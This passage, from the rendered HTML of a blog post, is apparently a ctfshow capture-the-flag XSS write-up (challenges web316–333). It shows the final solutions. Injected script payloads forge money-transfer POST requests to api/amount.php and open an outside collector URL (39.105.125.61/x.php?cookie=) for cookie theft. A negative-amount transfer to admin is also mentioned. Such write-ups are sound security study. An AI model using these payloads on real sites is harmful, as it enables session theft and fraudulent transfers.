function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">u</span>:<span class="string">&quot;as&quot;</span>,<span class="attr">a</span>:<span class="number">41560</span></span><br><span class="line">&#125;));<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://39.105.125.61/x.php?cookie=&#x27;</span>+<span class="string">&quot;13al44&quot;</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;anzbig&#x27;,a:&#x27;1223&#x27;&#125;&#125;);window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+&quot;aaa&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.post(&quot;http://127.0.0.1/api/amount.php&quot;,&#123;&#x27;u&#x27;:&#x27;anzbig&#x27; ,&#x27;a&#x27;:10000&#125;,&quot;json&quot;);window.open(&#x27;http://39.105.125.61/x.php?cookie=&#x27;+&quot;aaa&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313215531540.png" alt="image-20230313215531540"></p>
+<h2 id="方法二-3"><a href="#方法二-3" class="headerlink" title="方法二"></a>方法二</h2><p>大佬利用逻辑漏洞向admin转负数……orz</p>
+<h2 id="方法三-2"><a href="#方法三-2" class="headerlink" title="方法三"></a>方法三</h2><p>给自己转</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230313222613946.png" alt="image-20230313222613946"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://aaanz.github.io">anz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://aaanz.github.io/ctfshow/xss/XSS/">https://aaanz.github.io/ctfshow/xss/XSS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://aaanz.github.io" target="_blank">anz</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a><a class="post-meta__tags" href="/tags/xss/">xss</a></div><div class="post_share"><div class="social-share" data-image="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/js/jQuery/"><img class="prev-cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">jQuery</div></div></a></div><div class="next-post pull-right"><a href="/ctfshow/js/nodejs/"><img class="next-cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">nodejs</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/ctfshow/js/nodejs/" title="nodejs"><img class="cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-15</div><div class="title">nodejs</div></div></a></div><div><a href="/ctfshow/ssrf/" title="SSRF"><img class="cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-16</div><div class="title">SSRF</div></div></a></div><div><a href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="权限维持"><img class="cover" src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-12</div><div class="title">权限维持</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/75899c342847e73b.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">anz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aaanz"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to anz's blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web316"><span class="toc-number">1.</span> <span class="toc-text">web316</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web317"><span class="toc-number">2.</span> <span class="toc-text">web317</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web318"><span class="toc-number">3.</span> <span class="toc-text">web318</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web319"><span class="toc-number">4.</span> <span class="toc-text">web319</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web320"><span class="toc-number">5.</span> <span class="toc-text">web320</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web321-327"><span class="toc-number">6.</span> <span class="toc-text">web321-327</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web328"><span class="toc-number">7.</span> <span class="toc-text">web328</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web329"><span class="toc-number">8.</span> <span class="toc-text">web329</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">8.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">8.2.</span> <span class="toc-text">方法二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-number">8.3.</span> <span class="toc-text">方法三</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="toc-number">8.4.</span> <span class="toc-text">方法四</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web330"><span class="toc-number">9.</span> <span class="toc-text">web330</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-1"><span class="toc-number">9.1.</span> <span class="toc-text">方法一:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-1"><span class="toc-number">9.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web331"><span class="toc-number">10.</span> <span class="toc-text">web331</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-2"><span class="toc-number">10.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-2"><span class="toc-number">10.2.</span> <span class="toc-text">方法二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-1"><span class="toc-number">10.3.</span> <span class="toc-text">方法三:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web332-333"><span class="toc-number">11.</span> <span class="toc-text">web332-333</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-3"><span class="toc-number">11.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-3"><span class="toc-number">11.2.</span> <span class="toc-text">方法二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-2"><span class="toc-number">11.3.</span> <span class="toc-text">方法三</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/web/miniL/" title="MiniL CTF"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MiniL CTF"/></a><div class="content"><a class="title" href="/web/miniL/" title="MiniL CTF">MiniL CTF</a><time datetime="2023-05-10T00:32:27.529Z" title="发表于 2023-05-10 08:32:27">2023-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web/D3%E5%A4%8D%E7%8E%B0/" title="D3复现"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="D3复现"/></a><div class="content"><a class="title" href="/web/D3%E5%A4%8D%E7%8E%B0/" title="D3复现">D3复现</a><time datetime="2023-05-03T08:27:47.715Z" title="发表于 2023-05-03 16:27:47">2023-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/" title="红日二"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日二"/></a><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/" title="红日二">红日二</a><time datetime="2023-04-20T07:14:49.281Z" title="发表于 2023-04-20 15:14:49">2023-04-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="权限维持"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="权限维持"/></a><div class="content"><a class="title" href="/ctfshow/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="权限维持">权限维持</a><time datetime="2023-04-12T11:52:44.895Z" title="发表于 2023-04-12 19:52:44">2023-04-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Docker/docker%E5%AD%A6%E4%B9%A0/" title="Docker学习"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker学习"/></a><div class="content"><a class="title" href="/Docker/docker%E5%AD%A6%E4%B9%A0/" title="Docker学习">Docker学习</a><time datetime="2023-04-09T16:38:36.000Z" title="发表于 2023-04-10 00:38:36">2023-04-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By anz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
